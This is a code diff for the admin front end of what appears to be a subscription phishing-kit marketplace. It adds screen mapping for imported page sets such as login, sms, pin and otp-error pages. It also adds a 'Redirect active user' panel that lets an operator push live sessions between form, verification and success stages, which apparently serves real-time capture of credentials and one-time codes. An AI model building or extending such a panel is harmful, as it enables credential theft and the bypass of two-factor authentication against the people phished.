@@ -715,7 +715,10 @@ function normalizePackage(pagePackage) {
   const billing = pagePackage.billingPeriods || {};
   const weekly = Number(billing.weekly ?? 25);
   const manifestScreens = pagePackage.packageManifest?.screens || [];
-  const previewFile = manifestScreens.find((screen) => screen.role === "entry")?.file
+  const entryScreenId = pagePackage.packageManifest?.entryScreenId || "";
+  const previewFile = manifestScreens.find((screen) => screen.id === entryScreenId && screen.enabled !== false)?.file
+    || manifestScreens.find((screen) => screen.role === "entry" && screen.enabled !== false)?.file
+    || manifestScreens.find((screen) => screen.enabled !== false)?.file
     || manifestScreens[0]?.file
     || "";
   const cleanDescription = pagePackage.packageManifest?.description || "Ready to preview and subscribe.";
@@ -1337,20 +1340,30 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
   const currentFileKey = normalizedRuntimeScreenFile(currentFile).toLowerCase();
   const page = getPageBySlug(pageSlug);
   const controlsDisabled = disabledPageCapabilityAttributes(page, "controlSessions");
+  const stageLabels = { form: "Form", verification: "Verification", success: "Success", other: "Other" };
+  const groupedTargets = ["form", "verification", "success", "other"]
+    .map((stage) => ({ stage, targets: pageTargets.filter((target) => (target.stage || "other") === stage) }))
+    .filter((group) => group.targets.length);
+  const targetButton = (target) => {
+    const isCurrent = currentFileKey
+      ? normalizedRuntimeScreenFile(target.file).toLowerCase() === currentFileKey
+      : Boolean(currentKey && normalizeFlowLabel(target.label) === currentKey);
+    return `
+      <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-id="${escapeHtml(target.id || "")}" data-session-target-file="${escapeHtml(target.file)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}"${controlsDisabled || (isCurrent && !target.forceReload ? ' disabled aria-disabled="true"' : "")}>
+        ${escapeHtml(target.label)}
+      </button>
+    `;
+  };
   return `
     <div class="session-command result-live-command">
       <strong class="flow-command-title">One-click flow</strong>
       <div class="session-route-buttons" aria-label="Redirect active user">
-        ${pageTargets.length ? pageTargets.map((target) => {
-          const isCurrent = currentFileKey
-            ? normalizedRuntimeScreenFile(target.file).toLowerCase() === currentFileKey
-            : Boolean(currentKey && normalizeFlowLabel(target.label) === currentKey);
-          return `
-          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-file="${escapeHtml(target.file)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}"${controlsDisabled || (isCurrent && !target.forceReload ? ' disabled aria-disabled="true"' : "")}>
-            ${escapeHtml(target.label)}
-          </button>
-        `;
-        }).join("") : "<span>No mapped pages found</span>"}
+        ${groupedTargets.length ? groupedTargets.map((group) => `
+          <div class="session-route-group" data-session-route-stage="${group.stage}">
+            <small>${stageLabels[group.stage]}</small>
+            <div>${group.targets.map(targetButton).join("")}</div>
+          </div>
+        `).join("") : "<span>No mapped pages found</span>"}
       </div>
       <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${controlsDisabled}>Clear</button>
       <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
@@ -1857,13 +1870,17 @@ function packageForUserPage(page) {
 
 function packageEntryFile(pagePackage) {
   const screens = pagePackage?.packageManifest?.screens || [];
-  return screens.find((screen) => screen.role === "entry")?.file || screens[0]?.file || "";
+  const entryScreenId = pagePackage?.packageManifest?.entryScreenId || "";
+  return screens.find((screen) => screen.id === entryScreenId && screen.enabled !== false)?.file
+    || screens.find((screen) => screen.role === "entry" && screen.enabled !== false)?.file
+    || screens.find((screen) => screen.enabled !== false)?.file
+    || "";
 }
 
 function sessionTargetLabel(screen, fallback = "Page") {
   const value = typeof screen === "string"
     ? screen
-    : screen?.name || screen?.title || screen?.label || screen?.file || fallback;
+    : screen?.buttonLabel || screen?.label || screen?.name || screen?.title || screen?.file || fallback;
   return String(value)
     .replace(/\\/g, "/")
     .split("/")
@@ -1891,11 +1908,12 @@ function refreshImportedScreenOrder() {
   rows.forEach((row, index) => {
     const order = row.querySelector("strong");
     const position = row.querySelector("em");
-    const role = row.querySelector("[data-package-screen-role]");
     if (order) order.innerHTML = `&#8942;&#8942; ${String(index + 1).padStart(2, "0")}`;
-    if (position) position.textContent = index === 0 ? "Entry" : index === rows.length - 1 ? "Final" : "Screen";
-    if (role && index === 0) role.value = "entry";
-    else if (role?.value === "entry") role.value = "other";
+    if (position) {
+      const isEntry = Boolean(row.querySelector("[data-package-screen-entry]")?.checked);
+      const isFinal = Boolean(row.querySelector("[data-package-screen-final]")?.checked);
+      position.textContent = isEntry ? "Entry" : isFinal ? "Final" : "Screen";
+    }
     row.querySelector('[data-package-screen-move="up"]')?.toggleAttribute("disabled", index === 0);
     row.querySelector('[data-package-screen-move="down"]')?.toggleAttribute("disabled", index === rows.length - 1);
   });
@@ -1911,17 +1929,33 @@ function collectAdminPackagePayload(page) {
   }
   const designTokens = { ...(page.designTokens || {}) };
   preview.querySelectorAll("[data-package-token]").forEach((field) => { designTokens[field.dataset.packageToken] = field.value.trim(); });
-  const existingScreens = page.packageManifest?.screens || [];
-  const mappedScreens = [...preview.querySelectorAll("[data-package-screen-role]")].map((field) => {
-    const file = field.dataset.packageScreenRole;
-    const existing = existingScreens.find((item) => (item.file || item.path || item) === file);
-    return { ...(typeof existing === "object" ? existing : {}), file, role: field.value };
+  const rows = [...preview.querySelectorAll("[data-package-screen-row]")];
+  const mappedScreens = rows.map((row, order) => {
+    const id = String(row.dataset.packageScreenId || "").trim();
+    const file = String(row.dataset.packageScreenFile || "").trim();
+    const buttonLabel = row.querySelector("[data-package-screen-label]")?.value.trim() || "";
+    if (!buttonLabel) throw new Error(`Enter a redirect button name for ${file}`);
+    return {
+      id,
+      file,
+      buttonLabel,
+      stage: row.querySelector("[data-package-screen-stage]")?.value || "other",
+      state: row.querySelector("[data-package-screen-state]")?.value || "default",
+      enabled: Boolean(row.querySelector("[data-package-screen-enabled]")?.checked),
+      showInRedirects: Boolean(row.querySelector("[data-package-screen-redirect]")?.checked),
+      order
+    };
   });
+  const entryScreenId = rows.find((row) => row.querySelector("[data-package-screen-entry]")?.checked)?.dataset.packageScreenId || "";
+  const finalScreenId = rows.find((row) => row.querySelector("[data-package-screen-final]")?.checked)?.dataset.packageScreenId || "";
   const packageManifest = {
     ...(page.packageManifest || {}),
+    schemaVersion: 2,
+    entryScreenId,
+    finalScreenId,
     type: value("type", page.type || page.sourceType || "Page package"),
     description: value("description", page.description || ""),
-    screens: mappedScreens.length ? mappedScreens : existingScreens
+    screens: mappedScreens
   };
   return {
     name: value("name", page.name),
@@ -1931,7 +1965,7 @@ function collectAdminPackagePayload(page) {
     sourceType: value("sourceType", page.sourceType || "upload"),
     repoUrl: value("repoUrl", page.repoUrl || ""),
     billingPeriods,
-    screens: mappedScreens.map((screen) => screen.name || String(screen.file || "").split("/").pop().replace(/\.html?$/i, "").replace(/[-_]+/g, " ")),
+    screens: mappedScreens.map((screen) => screen.buttonLabel),
     designTokens,
     packageManifest
   };
@@ -2033,6 +2067,7 @@ function sessionPageTargets(page) {
     .map((file) => file.toLowerCase()));
   const seen = new Set();
   return candidates.reduce((targets, screen) => {
+    if (typeof screen === "object" && (screen?.enabled === false || screen?.showInRedirects === false)) return targets;
     const file = normalizedRuntimeScreenFile(sessionTargetFile(screen, manifestScreens));
     const key = file.toLowerCase();
     if (!file || seen.has(key) || (availableFiles.size && !availableFiles.has(key))) return targets;
@@ -2042,6 +2077,8 @@ function sessionPageTargets(page) {
       file,
       label: sessionTargetLabel(screen, file),
       role: screen?.role || (targets.length === 0 ? "entry" : "screen"),
+      stage: screen?.stage || (screen?.role === "entry" ? "form" : screen?.role) || "other",
+      state: screen?.state || "default",
       order: targets.length
     });
     return targets;
@@ -4039,20 +4076,20 @@ function renderAdminImportWizard(sourceType = "local") {
   const importChecks = [
     ["Source", isGithub ? "Repo URL, branch, folder" : "Zip or loose files"],
     ["Files", "HTML, CSS, JS, media"],
+    ["Screens", "Name buttons, stage, state, order"],
     ["Preview", "Sandbox before publish"],
-    ["Package", "Name, slug, price"],
     ["Publish", "Marketplace visibility"]
   ];
   const starterFiles = isGithub
-    ? ["index.html", "login.html", "otp.html", "success.html", "style.css"]
-    : ["index.html", "login.html", "otp.html", "style.css", "assets/logo.svg"];
+    ? ["index.html", "login2.html", "sms.html", "sms2.html", "pin.html"]
+    : ["start.htm", "login.html", "otp-error.html", "success.html", "assets/logo.svg"];
 
   preview.innerHTML = `
     <section class="app-view">
       <div class="view-heading">
         <small>admin import wizard</small>
         <h2>${sourceLabel}</h2>
-        <p>Bring in a page, verify detected files, preview it, then save a draft or publish a package.</p>
+        <p>Bring in any HTML page set, then name and arrange every redirect screen before publishing.</p>
       </div>
       ${viewNav([
         routeButton("#admin", "&#8592; Admin Studio", "primary"),
@@ -4082,8 +4119,7 @@ function renderAdminImportWizard(sourceType = "local") {
             </div>
             <div class="admin-actions">
               <button type="button" data-github-scan>Scan repo</button>
-              <button type="button" data-github-import>Create draft package</button>
-              <button type="button" data-github-publish>Import & Publish</button>
+              <button type="button" data-github-import>Create draft & map screens</button>
             </div>
           ` : `
             <div class="import-settings-grid">
@@ -4100,8 +4136,7 @@ function renderAdminImportWizard(sourceType = "local") {
               <span>Versioned source</span>
             </div>
             <div class="admin-actions">
-              <button type="button" data-local-import="draft">Upload & create draft</button>
-              <button type="button" data-local-import="publish">Upload & publish</button>
+              <button type="button" data-local-import="draft">Upload draft & map screens</button>
             </div>
           `}
         </article>
@@ -4111,7 +4146,7 @@ function renderAdminImportWizard(sourceType = "local") {
           <h3>Scan and preview</h3>
           <div class="admin-code-sample" data-github-result>
             <code>${isGithub ? `API connection required: ${escapeHtml(apiBase())}` : "R2 connection required. Select one ZIP, loose files, or a folder."}</code>
-            <code>${isGithub ? "Scan a repo to detect screens, CSS, scripts, and assets." : "index.html is required. PHP and unsafe paths are rejected."}</code>
+            <code>${isGithub ? "Scan a repo to detect screens, CSS, scripts, and assets." : "At least one .html or .htm file is required. PHP and unsafe paths are rejected."}</code>
           </div>
         </article>
 
@@ -4131,7 +4166,7 @@ function renderAdminImportWizard(sourceType = "local") {
 
         <article class="security-panel">
           <small>expected map</small>
-          <h3>Starter file roles</h3>
+          <h3>Example file set</h3>
           <div class="file-map-list">
             ${starterFiles.map((file, index) => `
               <div>
@@ -4178,10 +4213,44 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
 
   const thumbnailUrl = packageThumbnailUrl(page);
   const thumbnailLabel = page.thumbnailDataUrl ? "Manual thumbnail active" : page.thumbnailPath ? page.thumbnailPath : "No thumbnail override";
-  const editorScreens = Array.from(new Set([
-    ...(page.packageManifest?.screens || []).map((item) => item.file || item.path || item),
-    ...(page.screens || []).map((item) => item.file || item.path || item)
+  const configuredScreens = (page.packageManifest?.screens || []).filter((item) => typeof item === "object" && (item.file || item.path));
+  const htmlFiles = (page.packageManifest?.files || [])
+    .map((item) => item?.path || item?.file || item)
+    .filter((file) => /\.html?$/i.test(String(file || "")));
+  const editorFiles = Array.from(new Set([
+    ...configuredScreens.map((item) => item.file || item.path),
+    ...htmlFiles
   ].filter(Boolean)));
+  const editorScreens = editorFiles.map((file, index) => {
+    const configured = configuredScreens.find((item) => String(item.file || item.path).toLowerCase() === String(file).toLowerCase()) || {};
+    const buttonLabel = configured.buttonLabel || configured.label || configured.name || sessionTargetLabel({ file }, file);
+    const text = `${buttonLabel} ${file}`.toLowerCase();
+    const legacyRole = String(configured.role || "").toLowerCase();
+    const stage = configured.stage
+      || (["form", "verification", "success", "other"].includes(legacyRole) ? legacyRole : "")
+      || (/success|complete|thanks|redirect/.test(text) ? "success" : /otp|verify|sms|pin|code|confirm/.test(text) ? "verification" : /login|signin|email|form|info|index/.test(text) ? "form" : "other");
+    const state = configured.state
+      || (/error|invalid|wrong|failed/.test(text) || /(?:^|[-_])2\.html?$/i.test(file) ? "error" : /retry|again/.test(text) ? "retry" : "default");
+    const fallbackId = `scr_${page.slug}_${index + 1}`.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 80);
+    return {
+      ...configured,
+      id: configured.id || fallbackId,
+      file,
+      buttonLabel,
+      stage,
+      state,
+      enabled: configured.enabled !== false,
+      showInRedirects: configured.showInRedirects !== false
+    };
+  });
+  const configuredEntryId = page.packageManifest?.entryScreenId
+    || editorScreens.find((screen) => screen.role === "entry")?.id
+    || editorScreens.find((screen) => /(^|\/)index\.html?$/i.test(screen.file))?.id
+    || editorScreens[0]?.id
+    || "";
+  const configuredFinalId = page.packageManifest?.finalScreenId
+    || editorScreens.find((screen) => screen.stage === "success")?.id
+    || "";
 
   preview.innerHTML = `
     <section class="app-view">
@@ -4254,19 +4323,29 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
           <label><span>Description</span><textarea data-package-field="description">${escapeHtml(page.description || "")}</textarea></label>
         </article>
 
-        <article class="security-panel">
+        <article class="security-panel screen-mapping-panel">
           <small>file mapping</small>
           <h3>Imported screens</h3>
+          <p>Name the live redirect buttons, group each screen by stage, and choose entry/final independently from file order.</p>
+          <label class="screen-final-none"><input type="radio" name="package-final-screen" data-package-screen-final-none ${configuredFinalId ? "" : "checked"}> No final screen</label>
           <div class="file-map-list">
             ${editorScreens.map((screen, index) => `
-              <div draggable="true" data-package-screen-row="${escapeHtml(screen)}">
+              <div class="screen-map-row" draggable="true" data-package-screen-row="${escapeHtml(screen.id)}" data-package-screen-id="${escapeHtml(screen.id)}" data-package-screen-file="${escapeHtml(screen.file)}">
                 <strong title="Drag to reorder">&#8942;&#8942; ${String(index + 1).padStart(2, "0")}</strong>
-                <span>${escapeHtml(screen)}</span>
-                <em>${index === 0 ? "Entry" : index === editorScreens.length - 1 ? "Final" : "Screen"}</em>
-                <select data-package-screen-role="${escapeHtml(screen)}">
-                  ${["entry", "form", "verification", "success", "other"].map((role) => `<option value="${role}" ${String(page.packageManifest?.screens?.find((item) => (item.file || item) === screen)?.role || "other") === role ? "selected" : ""}>${role}</option>`).join("")}
-                </select>
-                <span class="screen-order-actions"><button type="button" data-package-screen-move="up" aria-label="Move ${escapeHtml(screen)} up">&#8593;</button><button type="button" data-package-screen-move="down" aria-label="Move ${escapeHtml(screen)} down">&#8595;</button></span>
+                <div class="screen-map-file">
+                  <span>${escapeHtml(screen.file)}</span>
+                  <label><small>Redirect button name</small><input type="text" maxlength="80" data-package-screen-label value="${escapeHtml(screen.buttonLabel)}"></label>
+                </div>
+                <label class="screen-map-stage"><small>Stage</small><select data-package-screen-stage>${["form", "verification", "success", "other"].map((stage) => `<option value="${stage}" ${screen.stage === stage ? "selected" : ""}>${stage}</option>`).join("")}</select></label>
+                <label class="screen-map-state"><small>State</small><select data-package-screen-state>${["default", "error", "retry", "alternate"].map((state) => `<option value="${state}" ${screen.state === state ? "selected" : ""}>${state}</option>`).join("")}</select></label>
+                <div class="screen-map-flags">
+                  <label><input type="radio" name="package-entry-screen" data-package-screen-entry ${screen.id === configuredEntryId ? "checked" : ""}> Entry</label>
+                  <label><input type="radio" name="package-final-screen" data-package-screen-final ${screen.id === configuredFinalId ? "checked" : ""}> Final</label>
+                  <label><input type="checkbox" data-package-screen-enabled ${screen.enabled ? "checked" : ""}> Enabled</label>
+                  <label><input type="checkbox" data-package-screen-redirect ${screen.showInRedirects ? "checked" : ""}> Redirect</label>
+                </div>
+                <em>${screen.id === configuredEntryId ? "Entry" : screen.id === configuredFinalId ? "Final" : "Screen"}</em>
+                <span class="screen-order-actions"><button type="button" data-package-screen-move="up" aria-label="Move ${escapeHtml(screen.buttonLabel)} up">&#8593;</button><button type="button" data-package-screen-move="down" aria-label="Move ${escapeHtml(screen.buttonLabel)} down">&#8595;</button></span>
               </div>
             `).join("")}
           </div>
@@ -6571,7 +6650,7 @@ function renderLocalImportResult(result) {
     <code>${Number(result.files || scan.files?.length || 0)} files saved to private R2 storage.</code>
     <code>${escapeHtml(review.status || "ready")} — ${(review.warnings || []).length} warning(s)</code>
     ${(review.warnings || []).map((warning) => `<code>${escapeHtml(warning)}</code>`).join("")}
-    ${previewReady ? `<div class="import-result-actions"><button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button><button type="button" data-route="#admin-package-${escapeHtml(pagePackage.slug)}">Edit package</button></div>` : ""}
+    ${pagePackage ? `<div class="import-result-actions">${previewReady ? `<button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button>` : ""}<button type="button" data-route="#admin-package-${escapeHtml(pagePackage.slug)}">Map screens & publish</button></div>` : ""}
   `;
 }
 
@@ -7051,15 +7130,15 @@ function renderGithubImportResult(scan, pagePackage) {
     ${pagePackage ? `
       <div class="import-result-actions">
         ${previewReady ? `<button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button>` : ""}
-        ${editorHash ? `<button type="button" data-route="${escapeHtml(editorHash)}">Edit package</button>` : ""}
+        ${editorHash ? `<button type="button" data-route="${escapeHtml(editorHash)}">Map screens & publish</button>` : ""}
       </div>
     ` : ""}
     <div class="github-preview-panel">
       <div>
         <strong>Screen preview</strong>
         ${htmlScreens.length ? htmlScreens.map((screen, index) => `
-          <button type="button" data-github-preview-url="${escapeHtml(githubPreviewUrl(scan, screen.file))}" data-github-raw-url="${escapeHtml(githubFileUrl(scan, screen.file, "raw"))}" data-github-preview-name="${escapeHtml(screen.name)}">
-            ${String(index + 1).padStart(2, "0")} ${escapeHtml(screen.name)} - ${escapeHtml(screen.file)}
+          <button type="button" data-github-preview-url="${escapeHtml(githubPreviewUrl(scan, screen.file))}" data-github-raw-url="${escapeHtml(githubFileUrl(scan, screen.file, "raw"))}" data-github-preview-name="${escapeHtml(screen.buttonLabel || screen.name || screen.file)}">
+            ${String(index + 1).padStart(2, "0")} ${escapeHtml(screen.buttonLabel || screen.name || screen.file)} - ${escapeHtml(screen.file)}
           </button>
         `).join("") : "<span>No HTML screens found yet.</span>"}
       </div>
@@ -7072,13 +7151,13 @@ function renderGithubImportResult(scan, pagePackage) {
     ${firstPreviewUrl ? `
       <div class="github-iframe-shell">
         <div>
-          <strong data-github-preview-title>Previewing ${escapeHtml(htmlScreens[0].name)}</strong>
+          <strong data-github-preview-title>Previewing ${escapeHtml(htmlScreens[0].buttonLabel || htmlScreens[0].name || htmlScreens[0].file)}</strong>
           <a href="${escapeHtml(githubFileUrl(scan, htmlScreens[0].file, "raw"))}" target="_blank" rel="noopener" data-github-preview-open>Open raw</a>
         </div>
         <iframe title="GitHub page preview" src="${escapeHtml(firstPreviewUrl)}" data-github-preview-frame sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe>
       </div>
     ` : ""}
-    <code>Review these files before clicking Import & Publish.</code>
+    <code>Create the draft, map its screens, preview it, then publish from the package editor.</code>
   `;
 }
 
@@ -7947,6 +8026,7 @@ preview.addEventListener("click", async (event) => {
     event.preventDefault();
     const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
     const sessionId = sessionRedirectButton.dataset.sessionRedirect;
+    const targetScreenId = String(sessionRedirectButton.dataset.sessionTargetId || "").trim();
     const targetFile = normalizedRuntimeScreenFile(sessionRedirectButton.dataset.sessionTargetFile);
     const forceReload = sessionRedirectButton.dataset.sessionForceReload === "true";
     if (!resultPage || !targetFile) {
@@ -7956,7 +8036,7 @@ preview.addEventListener("click", async (event) => {
     await withButtonBusy(sessionRedirectButton, "Redirecting", () => runResultsMutation(async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
         method: "POST",
-        body: JSON.stringify({ targetFile, forceReload })
+        body: JSON.stringify({ targetScreenId, targetFile, forceReload })
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
@@ -8044,6 +8124,12 @@ preview.addEventListener("click", async (event) => {
 preview.addEventListener("toggle", (event) => {
   if (event.target.matches?.("[data-compact-session]")) updateResultsAutoRefreshStatus();
 }, true);
+preview.addEventListener("change", (event) => {
+  if (event.target.matches?.("[data-package-screen-entry], [data-package-screen-final], [data-package-screen-final-none]")) {
+    refreshImportedScreenOrder();
+    statusText.textContent = "SCREEN MAPPING CHANGED / SAVE DRAFT TO PERSIST";
+  }
+});
 preview.addEventListener("dragstart", (event) => {
   const row = event.target.closest?.("[data-package-screen-row]");
   if (!row) return;
